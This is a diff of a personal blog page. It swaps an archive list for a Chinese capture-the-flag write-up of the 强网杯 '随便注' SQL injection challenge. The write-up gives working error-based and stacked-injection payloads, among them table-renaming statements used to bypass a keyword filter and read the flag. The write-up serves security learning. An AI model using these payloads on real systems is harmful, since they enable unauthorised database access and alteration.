@@ -47,7 +47,7 @@
 
     <!-- Title -->
     
-    <title>Archives: 2020 - Rejeta&#39;s Blog</title>
+    <title>Rejeta&#39;s Blog</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -136,9 +136,7 @@
 <div class="container">
 
     <!-- Main Content -->
-    
-
-<div class="row">
+    <div class="row">
     <div class="col-sm-12">
 
         <!--Title and Logo-->
@@ -146,223 +144,79 @@
     <div class="logo">
         <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
         
-            <h1 id="main-title" class="title">2020</h1>
-        
     </div>
 </header>
 
-        <section class="main archive-container">
+        <section class="main">
             
-                <div class="archive-post">
-    <a href="/2020/11/16/hello-world/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Hello World
-    </a>
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2020/11/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%20%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h1 id="强网杯-随便注"><a href="#强网杯-随便注" class="headerlink" title="强网杯 -随便注"></a>强网杯 -随便注</h1><p>根据题目描述“easy_sql”，很明显的sql注入，首先查看是什么类型的注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1 正常显示</span><br><span class="line">1&#39; 报错显示</span><br><span class="line">说明是字符型注入</span><br><span class="line"></span><br><span class="line">1&#39; and 1&#x3D;1 # 正常显示</span><br><span class="line">1&#39; and 1&#x3D;2 # 报错显示</span><br><span class="line">说明存在字符型的sql注入</span><br><span class="line"></span><br><span class="line">1&#39; order by 2 # 正常显示</span><br><span class="line">1&#39; order by 3 # 报错显示</span><br><span class="line">该注入中字段是2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>接下来要查一下数据库，但是这时候发生了错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and union select 1,database() #</span><br></pre></td></tr></table></figure>
+<p>用这句话来查一下数据库名，结果报错了<br>报错信息如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+<p>也就是说，sql对这些关键词进行了屏蔽，在大小写转换，截断绕过均无果的情况下，尝试别的注入方式</p>
+<font color=#00f size=3>
+报错注入
+
+<p>原理：通过构造注入语句，让数据库返回的报错信息中包含探测者想要知道的重要信息（比如数据库名，表名等信息）的sql攻击方式。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">payload: select count(*),(concat(floor(rand()*2),(select version())))x from user group by x</span><br><span class="line">floor():向下取整</span><br><span class="line">rand():随机数函数</span><br><span class="line">concat(): 将多个字符串连接成一个字符串</span><br><span class="line">version(): mysql数据库版本号查询</span><br><span class="line">2.update() </span><br><span class="line">payload: extractvalue(1,concat(0x7e,user(),0x7e));# --查询用户名</span><br><span class="line">         extractvalue(1,concat(0x7e,database(),0x7e));# --查询数据库</span><br><span class="line">         extractvalue(1,concat(0x7e,version(),0x7e));# --查询版本信息</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</font>
+报错注入能够获得的信息有限，还是拿不到flag，甚至表名和列名都还拿不到，为了拿到表名和列名，使用堆叠注入的方式。
+<font color=#0ff size=3>
+
+<p>堆叠注入<br>原理：在sql语言中，多条语句可以编写在一起执行，每条语句中间用分号隔开。使用这种多条语句一起执行的注入方式，就称为堆叠注入<br>1.查询数据库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: 1&#39;;show databases;#</span><br></pre></td></tr></table></figure>
+<p>2.查询表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: 1&#39;;show tables;#</span><br></pre></td></tr></table></figure>
+<p>3.查询字段名：（分别查询连个表的字段）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: 0&#39;;show columns from words;#</span><br><span class="line">        0&#39;;show conlumns from 1919810931114514;#</span><br></pre></td></tr></table></figure>
+
+</font>
+看到 1919810931114514 这个表中有我们所需要的flag字段，但是因为过滤了很多关键字，所以没办法直接查询到表中字段的具体内容。
+
+<p>所以我们换一个思路进行注入，我们把表进行重命名，两个表的名字进行互换，然后在word表中插入一列，列名叫做id，然后把flag改名为 data</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br></pre></td></tr></table></figure>
+<p>然后输入1’ or ‘1’=’1就能拿到flag了</p>
+
+    </div>
+
+    
+
+    
+
+    <!-- Comments -->
+    
+
 </div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/easyphp/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%20%E9%80%9A%E5%85%B3%EF%BC%88sql-5%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3(sql-1)/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5%EF%BC%88sql-11%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5%EF%BC%88sql-12%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-2%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-3%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-7%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-4%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-6%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-8~10%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20Buyflag/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-lab%E9%80%9A%E5%85%B3%EF%BC%88sql-13%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20Knife1/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%20%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20babysql/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20easysql/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20havefun/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20https/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20lovesql/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20secret%20file/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20upload/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
         </section>
+
     </div>
 </div>
+
 
 </div>
 
